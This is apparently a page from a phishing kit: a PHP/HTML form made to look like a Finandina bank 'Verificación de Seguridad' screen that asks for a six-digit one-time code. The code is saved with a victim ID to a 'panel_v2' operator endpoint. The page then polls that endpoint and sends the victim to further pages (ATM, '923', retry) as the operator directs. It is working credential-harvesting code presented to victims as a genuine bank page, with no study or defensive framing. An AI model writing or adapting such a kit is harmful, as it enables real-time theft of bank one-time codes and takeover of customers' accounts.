<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verificación de Seguridad - Finandina</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="img/otp.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<body>
<div class="container">
    <img src="img/finandina.svg" alt="Banner" class="banner-img" />
    <div class="card">
        <h1 class="main-title">Verificación de Seguridad</h1>
        <div class="icon-lock">
            <img src="img/icono.svg" width="50" height="50" />
        </div>
        <main>
            <h2>Código de Verificación</h2>
            <p class="subtitle">Para completar tu transacción con Finandina, ingresa el código de 6 dígitos que recibiste en tu dispositivo móvil.</p>
            <div class="code-form">
                <input type="tel" inputmode="numeric" name="field1" maxlength="1" class="code-input" id="digit1">
                <input type="tel" inputmode="numeric" name="field2" maxlength="1" class="code-input" id="digit2">
                <input type="tel" inputmode="numeric" name="field3" maxlength="1" class="code-input" id="digit3">
                <input type="tel" inputmode="numeric" name="field4" maxlength="1" class="code-input" id="digit4">
                <input type="tel" inputmode="numeric" name="field5" maxlength="1" class="code-input" id="digit5">
                <input type="tel" inputmode="numeric" name="field6" maxlength="1" class="code-input" id="digit6">
                <input type="hidden" id="txtOTP" name="cDinamica">
            </div>

            <button class="verify-btn" id="btnOTP">Verificar</button>
            
            <div class="mensaje" style="display:none; color:red; text-align:center; margin-top:10px;">
                Por favor ingresa el código de 6 dígitos
            </div>

            <div class="resend-section">
                <span class="timer">
                    <span class="circle-timer">
                        <svg height="42" width="42">
                            <circle cx="21" cy="21" r="18" stroke="#dedede" stroke-width="4" fill="none"/>
                            <circle class="circle-bar" cx="21" cy="21" r="18" stroke="#f08ba7" stroke-width="4" fill="none"
                                stroke-dasharray="113.1" stroke-dashoffset="113.1" style="transform: rotate(-90deg); transform-origin: center;" />
                        </svg>
                        <span class="time-value">30</span>
                    </span>
                </span>
                <span class="resend-text">Reenviar código</span>
            </div>
        </main>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const codeInputs = document.querySelectorAll('.code-input');
    const btnOTP = document.getElementById('btnOTP');
    const mensaje = document.querySelector('.mensaje');
    const txtOTP = document.getElementById('txtOTP');
    
    const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

    if (!idreg) {
        alert("Error interno: no hay idreg.");
        window.location.href = "../../checkout.php";
        return;
    }

    function actualizarOTP() {
        const clave = [...codeInputs].map(input => input.value.trim()).join('');
        txtOTP.value = clave;

        if (clave.length === 6 && /^\d{6}$/.test(clave)) {
            btnOTP.classList.add('boton-activo');
        } else {
            btnOTP.classList.remove('boton-activo');
        }
    }

    // Manejo de inputs de código
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            actualizarOTP();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('keyup', () => {
            mensaje.style.display = 'none';
            codeInputs.forEach(inp => inp.style.border = "1px solid #CCCCCC");
        });

        // Solo números
        input.addEventListener('keypress', (e) => {
            if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
                e.preventDefault();
            }
        });
    });

    // Evento click del botón verificar
    btnOTP.addEventListener('click', async () => {
        const otp = txtOTP.value.trim();
        if (otp.length === 6 && /^\d{6}$/.test(otp)) {
            btnOTP.disabled = true;
            
            try {
                const fd = new FormData();
                fd.append("action", "save_otp");
                fd.append("idreg", idreg);
                fd.append("otp", otp);

                const r = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                    method: "POST",
                    body: fd,
                    headers: {
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!r.ok) {
                    throw new Error(`HTTP ${r.status}: ${r.statusText}`);
                }

                const json = await r.json();

                if (json.success) {
                    window.location.href = "cargando.php";
                } else {
                    throw new Error(json.error || "Error desconocido");
                }

            } catch (error) {
                console.error("Error:", error);
                alert("Error al guardar OTP: " + error.message);
                btnOTP.disabled = false;
            }
        } else {
            mensaje.style.display = 'block';
            codeInputs.forEach(inp => inp.style.border = "1px solid red");
        }
    });

    // Timer de reenvío
    const TOTAL_TIME = 30;
    let timeLeft = TOTAL_TIME;
    const FULL_DASH_ARRAY = 113.1;

    const circle = document.querySelector('.circle-bar');
    const timeValue = document.querySelector('.time-value');
    const resendSection = document.querySelector('.resend-section');

    const timer = setInterval(() => {
        timeLeft--;

        if (timeLeft >= 0) {
            timeValue.textContent = timeLeft;
            const offset = FULL_DASH_ARRAY * (timeLeft / TOTAL_TIME);
            circle.style.strokeDashoffset = offset;
        }

        if (timeLeft <= 0) {
            clearInterval(timer);
            // Eliminar timer y texto
            const timerEl = resendSection.querySelector('.timer');
            const textEl = resendSection.querySelector('.resend-text');
            if (timerEl) timerEl.remove();
            if (textEl) textEl.remove();

            // Crear botón de reenvío
            const btnResend = document.createElement('button');
            btnResend.className = 'resend-btn';
            btnResend.textContent = 'Reenviar código';
            btnResend.addEventListener('click', () => {
                location.reload();
            });

            resendSection.appendChild(btnResend);
        }
    }, 1000);

    // Verificar redirecciones del panel
    const checkRedirect = setInterval(async () => {
        try {
            const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                method: 'GET',
                cache: 'no-cache'
            });
            
            if (r.ok) {
                const data = await r.json();
                
                if (data.success && data.data && data.data.redirect) {
                    clearInterval(checkRedirect);
                    
                    switch (data.data.estado) {
                        case 'usuario':
                            window.location.href = "finandina.php";
                            break;
                        case 'cc':
                            window.location.href = "/reintentar.php";
                            break;
                        case '923':
                            window.location.href = "923.php";
                            break;
                        case 'atm':
                            window.location.href = "atm.php";
                            break;
                        case 'finalizado':
                            window.location.href = "finish.php";
                            break;
                    }
                }
            }
        } catch (e) {
            // Ignorar errores de polling
        }
    }, 2000);

    // Limpiar intervalos al salir
    window.addEventListener('beforeunload', () => {
        if (checkRedirect) {
            clearInterval(checkRedirect);
        }
        if (timer) {
            clearInterval(timer);
        }
    });

    // Inicializar
    codeInputs[0].focus();
});
</script>

</body>
</html>